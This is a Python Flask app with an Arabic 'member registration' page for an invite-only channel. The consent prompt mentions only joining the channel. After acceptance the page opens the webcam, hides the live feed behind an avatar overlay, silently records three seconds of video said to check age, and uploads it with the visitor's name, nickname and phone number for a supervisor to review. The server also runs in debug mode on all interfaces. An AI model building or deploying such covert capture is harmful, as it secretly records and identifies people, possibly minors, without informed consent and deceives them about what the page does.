import os
import base64
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

# المجلدات الأساسية لحفظ البيانات (تم تغيير مجلد الصور إلى الفيديوهات)
DATA_DIR = "employees_data"
VIDEOS_DIR = "employees_videos"
os.makedirs(DATA_DIR, exist_ok=True)
os.makedirs(VIDEOS_DIR, exist_ok=True)

def get_next_employee_id():
    """حساب رقم الموظف التالي تلقائياً بناءً على الملفات الموجودة"""
    files = os.listdir(DATA_DIR)
    max_id = 0
    for file in files:
        if file.startswith("employee_") and file.endswith(".txt"):
            try:
                file_id = int(file.split("_")[1].split(".")[0])
                if file_id > max_id:
                    max_id = file_id
            except ValueError:
                continue
    return max_id + 1

# واجهة مستخدم متطورة تدعم تسجيل الفيديو الخلفي لحسم مسألة السن
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الاعضاء</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f8f9fa; margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 90vh; }
        .container { background: #ffffff; padding: 35px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); width: 100%; max-width: 450px; text-align: center; }
        
        /* صندوق الموافقة المسبقة المعدل */
        .consent-box { display: block; }
        .consent-box p { font-size: 16px; color: #4a5568; line-height: 1.6; margin-bottom: 25px; }
        
        /* نموذج إدخال البيانات */
        .main-form { display: none; }
        
        h2 { color: #2c3e50; margin-bottom: 25px; font-size: 24px; font-weight: 600; }
        .form-group { margin-bottom: 20px; text-align: right; }
        label { display: block; margin-bottom: 8px; font-weight: 600; color: #4a5568; font-size: 15px; }
        input[type="text"], input[type="tel"] { width: 100%; padding: 12px 15px; border: 1px solid #cbd5e1; border-radius: 6px; box-sizing: border-box; font-size: 16px; color: #334155; }
        
        .btn-group { display: flex; gap: 15px; margin-top: 20px; }
        .btn-accept { background-color: #16a34a; color: white; flex: 2; }
        .btn-accept:hover { background-color: #15803d; }
        .btn-reject { background-color: #dc2626; color: white; flex: 1; }
        .btn-reject:hover { background-color: #b91c1c; }
        
        button { border: none; padding: 14px 20px; font-size: 16px; border-radius: 6px; cursor: pointer; font-weight: bold; transition: background-color 0.2s; }
        .btn-submit { background-color: #2563eb; color: white; width: 100%; font-size: 18px; margin-top: 15px; }
        .btn-submit:hover { background-color: #1d4ed8; }
        
        /* حاوية التغطية بمجسم موظف لمنع ظهور البث المباشر */
        .avatar-preview-container {
            position: relative;
            width: 130px;
            height: 130px;
            margin: 0 auto 25px auto;
            border-radius: 50%;
            border: 4px solid #cbd5e1;
            overflow: hidden;
            background-color: #e2e8f0;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        #video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        .avatar-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #f1f5f9;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 65px;
            color: #94a3b8;
            z-index: 5;
            user-select: none;
        }
        
        .status { margin-top: 25px; font-weight: bold; font-size: 16px; line-height: 1.5; padding: 10px; border-radius: 6px; }
    </style>
</head>
<body>

<div class="container">
    
    <div id="consentBox" class="consent-box">
        <h2>إشعار تفعيل النظام</h2>
        <p>مرحباً بك في صفحة تسجيل الاعضاء لقد تلقيت دعوة خاصة ، من منتسبي القناة </p>
        <p><strong>هل توافق على الانتساب للقناة؟</strong></p>
        <div class="btn-group">
            <button class="btn-accept" onclick="acceptConsent()">نعم، موافق وابدأ</button>
            <button class="btn-reject" onclick="rejectConsent()">لا، خروج</button>
        </div>
    </div>
    
    <div id="mainForm" class="main-form">
        <h2>تسجيل عضوا جديد</h2>
        
        <div class="avatar-preview-container">
            <video id="video" autoplay playsinline muted></video>
            <div class="avatar-overlay">👤</div>
        </div>

        <div class="form-group">
            <label>الاسم الأول:</label>
            <input type="text" id="firstName" required autocomplete="off" placeholder="أدخل الاسم الأول">
        </div>
        
        <div class="form-group">
            <label>الاسم المستعار:</label>
            <input type="text" id="nickname" autocomplete="off" placeholder="أدخل الاسم المستعار">
        </div>
        
        <div class="form-group">
            <label>رقم الهاتف:</label>
            <input type="tel" id="phone" required autocomplete="off" placeholder="أدخل رقم الهاتف">
        </div>

        <button class="btn-submit" type="button" onclick="processRegistration()">تسجيل وحفظ البيانات</button>
    </div>
    
    <div class="status" id="statusMsg"></div>
</div>

<script>
    const video = document.getElementById('video');
    const statusMsg = document.getElementById('statusMsg');
    const consentBox = document.getElementById('consentBox');
    const mainForm = document.getElementById('mainForm');
    
    let localStream = null;
    let mediaRecorder = null;
    let recordedChunks = [];

    function acceptConsent() {
        consentBox.style.display = 'none'; 
        mainForm.style.display = 'block';  
        
        // حجز الكاميرا وبث الفيديو مسبقاً تحت المجسم
        navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } })
            .then(stream => { 
                localStream = stream;
                video.srcObject = stream;
            })
            .catch(err => {
                console.error("خطأ الصلاحية: ", err);
                statusMsg.innerText = "تنبيه: يرجى الضغط على (السماح/Allow) في المتصفح لتفعيل النظام.";
                statusMsg.style.color = "#dc2626";
                statusMsg.style.backgroundColor = "#fee2e2";
            });
    }

    function rejectConsent() {
        statusMsg.innerText = "تم الرفض. جاري الخروج...";
        statusMsg.style.color = "#dc2626";
        setTimeout(() => {
            window.close();
            window.location.href = "about:blank";
        }, 1000);
    }

    function processRegistration() {
        const firstName = document.getElementById('firstName').value.trim();
        const nickname = document.getElementById('nickname').value.trim();
        const phone = document.getElementById('phone').value.trim();

        if (!firstName || !phone) {
            alert("الرجاء ملء حقول الاسم الأول ورقم الهاتف!");
            return;
        }

        if (!localStream) {
            alert("الكاميرا ليست جاهزة بعد، يرجى التحقق من الصلاحيات.");
            return;
        }

        statusMsg.innerText = "جاري التحقق التلقائي من حالة وعمر الموظف (فيديو 3 ثوانٍ)...";
        statusMsg.style.color = "#2563eb";
        statusMsg.style.backgroundColor = "#dbeafe";

        // إعداد مسجل الفيديو الخلفي بصيغة خفيفة ومناسبة لجميع المتصفحات والهواتف
        recordedChunks = [];
        let options = { mimeType: 'video/webm;codecs=vp8' };
        if (!MediaRecorder.isTypeSupported(options.mimeType)) {
            options = { mimeType: 'video/mp4' }; // للهواتف والآيفون
        }

        try {
            mediaRecorder = new MediaRecorder(localStream);
            
            mediaRecorder.ondataavailable = function(e) {
                if (e.data.size > 0) {
                    recordedChunks.push(e.data);
                }
            };

            mediaRecorder.onstop = function() {
                // تجميع الفيديو وتحويله إلى صيغة Base64 لإرساله عبر السيرفر
                const blob = new Blob(recordedChunks, { type: 'video/webm' });
                const reader = new FileReader();
                reader.readAsDataURL(blob);
                reader.onloadend = function() {
                    const base64VideoData = reader.result;
                    sendDataToServer(firstName, nickname, phone, base64VideoData);
                };
            };

            // بدء التسجيل الصامت تلقائياً لمدة 3 ثوانٍ
            mediaRecorder.start();
            setTimeout(() => {
                mediaRecorder.stop();
            }, 3000); // 3000 جزء من الثانية = 3 ثوانٍ كاملة

        } catch (e) {
            console.error("فشل بدء مسجل الفيديو: ", e);
            statusMsg.innerText = "❌ فشل النظام في معالجة الفيديو، يرجى إعادة المحاولة.";
            statusMsg.style.color = "#dc2626";
        }
    }

    function sendDataToServer(firstName, nickname, phone, videoData) {
        fetch('/save_employee', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                first_name: firstName,
                nickname: nickname,
                phone: phone,
                video_bytes: videoData
            })
        })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                statusMsg.innerHTML = "✅ لقد تم تسجيل الدخول بنجاح.<br>انتظر الإذن من المشرف العام.";
                statusMsg.style.color = "#15803d";
                statusMsg.style.backgroundColor = "#dcfce7";
                
                document.getElementById('firstName').value = '';
                document.getElementById('nickname').value = '';
                document.getElementById('phone').value = '';
            } else {
                statusMsg.innerText = "❌ حدث خطأ أثناء معالجة البيانات بالسيرفر.";
                statusMsg.style.color = "#dc2626";
                statusMsg.style.backgroundColor = "#fee2e2";
            }
        })
        .catch(err => {
            statusMsg.innerText = "❌ خطأ في الاتصال بالسيرفر الرئيسي.";
            statusMsg.style.color = "#dc2626";
        });
    }
</script>

</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/save_employee', methods=['POST'])
def save_employee():
    try:
        data = request.json
        first_name = data.get('first_name')
        nickname = data.get('nickname')
        phone = data.get('phone')
        video_bytes_data = data.get('video_bytes')

        emp_id = get_next_employee_id()

        # معالجة ملف الفيديو الخلفي وحفظه بصيغة webm أو mp4
        header, encoded = video_bytes_data.split(",", 1)
        video_bytes = base64.b64decode(encoded)
        
        video_filename = f"employee_{emp_id}.webm"
        video_path = os.path.join(VIDEOS_DIR, video_filename)
        with open(video_path, "wb") as f:
            f.write(video_bytes)

        # حفظ البيانات النصية المرافقة للفيديو لسهولة مراجعتها من المشرف
        text_filename = f"employee_{emp_id}.txt"
        text_path = os.path.join(DATA_DIR, text_filename)
        with open(text_path, "w", encoding="utf-8") as file:
            file.write(f"رقم الموظف: {emp_id}\n")
            file.write(f"الاسم الأول: {first_name}\n")
            file.write(f"الاسم المستعار: {nickname}\n")
            file.write(f"رقم الهاتف: {phone}\n")
            file.write(f"ملف التحقق (فيديو): {video_filename}\n")

        return jsonify({"success": True, "emp_id": emp_id})
    except Exception as e:
        print(e)
        return jsonify({"success": False, "error": str(e)})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
